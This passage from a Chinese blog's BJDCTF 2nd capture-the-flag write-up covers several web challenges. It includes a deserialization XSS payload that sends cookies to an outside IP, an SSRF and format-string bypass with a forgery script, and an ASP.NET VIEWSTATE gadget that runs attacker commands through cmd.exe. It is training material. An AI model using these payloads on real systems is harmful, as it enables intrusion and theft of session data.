<h3 id="0x-06-xss之光"><a href="#0x-06-xss之光" class="headerlink" title="0x 06 xss之光"></a>0x 06 xss之光</h3><p>git泄露，直接GitHack得到源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];</span><br><span class="line">echo unserialize($a);</span><br></pre></td></tr></table></figure>

<p>参考这一篇文章：<a href="http://blog.ydspoplar.top/2020/03/17/php%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB/" target="_blank" rel="noopener">http://blog.ydspoplar.top/2020/03/17/php%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB/</a></p>
<p>题目环境是php5，所以使用<code>Exception</code>反序列化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test &#x3D; new Exception(&#39;&quot;&lt;script&gt;window.open(\&#39;http:&#x2F;&#x2F;174.1.83.107:9999&#x2F;?\&#39;+document.cookie);&lt;&#x2F;script&gt;&#39;);</span><br><span class="line">echo urlencode(serialize($test));</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">$a &#x3D; new Exception(&quot;&lt;script src&#x3D;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;z01e5x&gt;&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>在返回报文的cookie里面得到flag</p>
<h3 id="0x-07-Schrödinger"><a href="#0x-07-Schrödinger" class="headerlink" title="0x 07 Schrödinger"></a>0x 07 Schrödinger</h3><p>脑洞题。。</p>
<h3 id="0x-08-elementmaster"><a href="#0x-08-elementmaster" class="headerlink" title="0x 08 elementmaster"></a>0x 08 elementmaster</h3><p>化学题。。</p>
<h3 id="0x-09-文件探测"><a href="#0x-09-文件探测" class="headerlink" title="0x 09 文件探测"></a>0x 09 文件探测</h3><ol>
<li>根据源代码提示查看header，提示访问<code>home.php</code></li>
</ol>
<p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200324193518340.png" alt></p>
<ol start="2">
<li>url参数这里怀疑存在文件包含，用伪协议读一下system.php的源码，如下</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">    header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;</span><br><span class="line">$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;</span><br><span class="line">if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123;</span><br><span class="line">    $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;</span><br><span class="line">    $method &#x3D; $_POST[&#39;q3&#39;];</span><br><span class="line"></span><br><span class="line">    $str1 &#x3D; &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo $str1;</span><br><span class="line"></span><br><span class="line">    if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123;</span><br><span class="line">        die($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect &#x3D; @file_get_contents($url, false);</span><br><span class="line">    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>用同样的方法根据robots.txt的提示读取home.php源代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">setcookie(&quot;y1ng&quot;, sha1(md5(&#39;y1ng&#39;)), time() + 3600);</span><br><span class="line">setcookie(&#39;your_ip_address&#39;, md5($_SERVER[&#39;REMOTE_ADDR&#39;]), time()+3600);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    if (preg_match(&quot;&#x2F;\^|\~|&amp;|\|&#x2F;&quot;, $_GET[&#39;file&#39;])) &#123;</span><br><span class="line">        die(&quot;forbidden&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;&#x2F;.?f.?l.?a.?g.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">        die(&quot;not now!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;&#x2F;.?a.?d.?m.?i.?n.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">        die(&quot;You! are! not! my! admin!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;&#x2F;^home$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">        die(&quot;禁止套娃&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else&#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;home$&#x2F;i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;&#x2F;system$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">            $file &#x3D; $_GET[&#39;file&#39;].&quot;.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $file &#x3D; $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;现在访问的是 &quot;.$file . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        require $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;&lt;script&gt;location.href&#x3D;&#39;.&#x2F;home.php?file&#x3D;system&#39;&lt;&#x2F;script&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>对system.php进行代码审计发现传入的url必须是<a href="http://127.0.0.1/开头，且不能包含flag关键字" target="_blank" rel="noopener">http://127.0.0.1/开头，且不能包含flag关键字</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;</span><br><span class="line">$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;</span><br><span class="line">if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时进行内网访问的时候url会被在后面拼接上一个y1ng.txt的后缀，访问的方法必须是GET或者POST开头，但是没有判断结尾，然后用格式化输出文件的内容，存在格式化漏洞。</p>
<p>第一处我们可以传入参数绕过，第二处我们可以传入GET%s%把%d转义掉，完整payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q1&#x3D;s&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php?a&#x3D;1&amp;q3&#x3D;GET%s%</span><br></pre></td></tr></table></figure>

<p>访问得到admin.php源代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag &#x3D; &#39;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#39;; &#x2F;&#x2F;fake</span><br><span class="line"></span><br><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">    $iv &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;],true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()</span><br><span class="line">&#123;</span><br><span class="line">    if (isset($_COOKIE[&#39;your_ip_address&#39;]) &amp;&amp; $_COOKIE[&#39;your_ip_address&#39;] &#x3D;&#x3D;&#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_COOKIE[&#39;y1ng&#39;] &#x3D;&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))</span><br><span class="line">        return true;</span><br><span class="line">    else</span><br><span class="line">        return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D;&#x3D; &quot;127.0.0.1&quot; ) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;black&gt;&lt;center&gt;&lt;font size&#x3D;&#39;10px&#39; color&#x3D;white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;user&#39;] &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;decrypt&#39;])) &#123;</span><br><span class="line">    $decr &#x3D; $_GET[&#39;decrypt&#39;];</span><br><span class="line">    if (Check())&#123;</span><br><span class="line">        $data &#x3D; $_SESSION[&#39;secret&#39;];</span><br><span class="line">        include &#39;flag_2sln2ndln2klnlksnf.php&#39;;</span><br><span class="line">        $cipher &#x3D; aesEn($data, &#39;y1ng&#39;);</span><br><span class="line">        if ($decr &#x3D;&#x3D;&#x3D; $cipher)&#123;</span><br><span class="line">            echo WHAT_YOU_WANT;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&#39;爬&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F;I heard you can break PHP mt_rand seed</span><br><span class="line">    mt_srand(rand(0,9999999));</span><br><span class="line">    $length &#x3D; mt_rand(40,80);</span><br><span class="line">    $_SESSION[&#39;secret&#39;] &#x3D; bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>分析admin.php,发现需要验证加密的结果一致，才能得到flag。题目的加密无法破解，但是存在逻辑Bug，只要通过删除PHPSESSID将SESSION置空，就将<code>$data</code>置空了，这样AES加密的其他参数就都是已知的了，就可以自己算出密文了，加密脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">    $iv &#x3D; md5(&#39;174.0.222.75&#39;,true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cipher &#x3D; aesEn(null, &#39;y1ng&#39;);</span><br><span class="line">echo $cipher;</span><br></pre></td></tr></table></figure>

<p>将结果传给decrypt，然后删掉PHPSESSID，得到flag，<strong>注意结果中存在加号，需要url编码后传参</strong>，这边可以借鉴使用一位师傅的脚本发包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line"></span><br><span class="line">cipher &#x3D; &#39;70klfZeYC%2bWlC045CcKhtg&#x3D;&#x3D;&#39; # 刚刚生成的cipher</span><br><span class="line"></span><br><span class="line">s.cookies.set(&#39;your_ip_address&#39;, &#39;76d9f00467e5ee6abc3ca60892ef304e&#39;) # 你的IP的MD5</span><br><span class="line">s.cookies.set(&#39;y1ng&#39;, &#39;8880cbd71721332a25aa6df7b12eb7ac53539100&#39;)</span><br><span class="line"></span><br><span class="line">print(s.post(f&#39;http:&#x2F;&#x2F;7a66a822-c9b0-4def-9b00-a476088c425f.node3.buuoj.cn&#x2F;admin.php?decrypt&#x3D;&#123;cipher&#125;&#39;,).text)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考资料：</p>
<p><a href="https://zhuanlan.zhihu.com/p/115462788" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/115462788</a></p>
<p><a href="https://www.gem-love.com/ctf/2097.html#File_Detect" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2097.html#File_Detect</a></p>
</blockquote>
<h3 id="0x-10-EasyAspDotNet"><a href="#0x-10-EasyAspDotNet" class="headerlink" title="0x 10 EasyAspDotNet"></a>0x 10 EasyAspDotNet</h3><ul>
<li><p>考点</p>
<p>任意文件读取、ASP.NET  VIEWSTATE 反序列化有回显 RCE、Windows 基本操作</p>
</li>
<li><p>解题过程</p>
</li>
</ul>
<ol>
<li>打开页面有一个点击按钮，点击会生成一张图片，查看页面元素，怀疑有文件读取</li>
</ol>
<p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200324114119983.png" alt></p>
<ol start="2">
<li>根据url中的 .aspx 后缀，尝试读取 web.config 文件</li>
</ol>
<p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200324114358122.png" alt></p>
<p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200324114429815.png" alt></p>
<ol start="3">
<li>根据这两篇文章所述</li>
</ol>
<p><a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門</a></p>
<p><a href="https://www.4hou.com/posts/GYq7" target="_blank" rel="noopener">如何借助ViewState在ASP.NET中实现反序列化漏洞利用</a></p>
<p>构造一个带回显的 VIEWSTATE Payload，来让服务器反序列化然后 RCE。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class E</span><br><span class="line">&#123;</span><br><span class="line">    public E()</span><br><span class="line">    &#123;</span><br><span class="line">        System.Web.HttpContext context &#x3D; System.Web.HttpContext.Current;</span><br><span class="line">        context.Server.ClearError();</span><br><span class="line">        context.Response.Clear();</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.Process process &#x3D; new System.Diagnostics.Process();</span><br><span class="line">            process.StartInfo.FileName &#x3D; &quot;cmd.exe&quot;;</span><br><span class="line">            string cmd &#x3D; context.Request.Form[&quot;cmd&quot;];</span><br><span class="line">            process.StartInfo.Arguments &#x3D; &quot;&#x2F;c &quot; + cmd;</span><br><span class="line">            process.StartInfo.RedirectStandardOutput &#x3D; true;</span><br><span class="line">            process.StartInfo.RedirectStandardError &#x3D; true;</span><br><span class="line">            process.StartInfo.UseShellExecute &#x3D; false;</span><br><span class="line">            process.Start();</span><br><span class="line">            string output &#x3D; process.StandardOutput.ReadToEnd();</span><br><span class="line">            context.Response.Write(output);</span><br><span class="line">        &#125; catch (System.Exception) &#123;&#125;</span><br><span class="line">        context.Response.Flush();</span><br><span class="line">        context.Response.End();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里需要引入System.dll和System.Web.dll两个库，生成payload如下：</p>
<p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%5Cimage-20200324115344089.png" alt></p>
<p>将payload进行url编码后用burp发送测试成功</p>
<p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200324120841201.png" alt></p>
<p>获得flag：</p>
<p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200324121000106.png" alt></p>
<p>补充：<a href="http://viewstatedecoder.azurewebsites.net/" target="_blank" rel="noopener">解码ViewState的网站</a></p>

  </div>
</article>

        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">1.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-01-签到"><span class="toc-number">1.1.</span> <span class="toc-text">0x 01 签到</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-02-燕言燕语"><span class="toc-number">1.2.</span> <span class="toc-text">0x 02 燕言燕语</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-03-Y1nglish"><span class="toc-number">1.3.</span> <span class="toc-text">0x 03 Y1nglish</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-04-老文盲了"><span class="toc-number">1.4.</span> <span class="toc-text">0x 04 老文盲了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-05-cat-flag"><span class="toc-number">1.5.</span> <span class="toc-text">0x 05 cat_flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-06-灵能精通"><span class="toc-number">1.6.</span> <span class="toc-text">0x 06 灵能精通</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-07-rsa0"><span class="toc-number">1.7.</span> <span class="toc-text">0x 07 rsa0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-08-rsa1"><span class="toc-number">1.8.</span> <span class="toc-text">0x 08 rsa1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-01-Real-EasyBaBa"><span class="toc-number">2.1.</span> <span class="toc-text">0x 01 Real_EasyBaBa</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-02-最简单的misc"><span class="toc-number">2.2.</span> <span class="toc-text">0x 02 最简单的misc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-03-A-Beautiful-Picture"><span class="toc-number">2.3.</span> <span class="toc-text">0x 03 A_Beautiful_Picture</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-04-圣火昭昭"><span class="toc-number">2.4.</span> <span class="toc-text">0x 04 圣火昭昭</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-05-TARGZ"><span class="toc-number">2.5.</span> <span class="toc-text">0x 05 TARGZ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-06-Imagin"><span class="toc-number">2.6.</span> <span class="toc-text">0x 06 Imagin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-07-EasyBaBa"><span class="toc-number">2.7.</span> <span class="toc-text">0x 07 EasyBaBa</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-08-小姐姐"><span class="toc-number">3.</span> <span class="toc-text">0x 08 小姐姐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">4.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-01-fake-google"><span class="toc-number">4.1.</span> <span class="toc-text">0x 01 fake google</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-02-old-hack"><span class="toc-number">4.2.</span> <span class="toc-text">0x 02 old-hack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-03-duangShell"><span class="toc-number">4.3.</span> <span class="toc-text">0x 03 duangShell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-简单注入"><span class="toc-number">5.</span> <span class="toc-text">0x 04 简单注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-假猪套天下第一"><span class="toc-number">6.</span> <span class="toc-text">0x 05 假猪套天下第一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-xss之光"><span class="toc-number">7.</span> <span class="toc-text">0x 06 xss之光</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-07-Schrödinger"><span class="toc-number">8.</span> <span class="toc-text">0x 07 Schrödinger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-08-elementmaster"><span class="toc-number">9.</span> <span class="toc-text">0x 08 elementmaster</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-09-文件探测"><span class="toc-number">10.</span> <span class="toc-text">0x 09 文件探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-10-EasyAspDotNet"><span class="toc-number">11.</span> <span class="toc-text">0x 10 EasyAspDotNet</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/&title=BJDCTF 2nd解题记录" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/&title=BJDCTF 2nd解题记录" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/&text=BJDCTF 2nd解题记录" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BJDCTF 2nd解题记录&body=Check out this article: http://yoursite.com/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 John Doe 
    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
    
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
  
  <div class="footer-custom">
    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
     
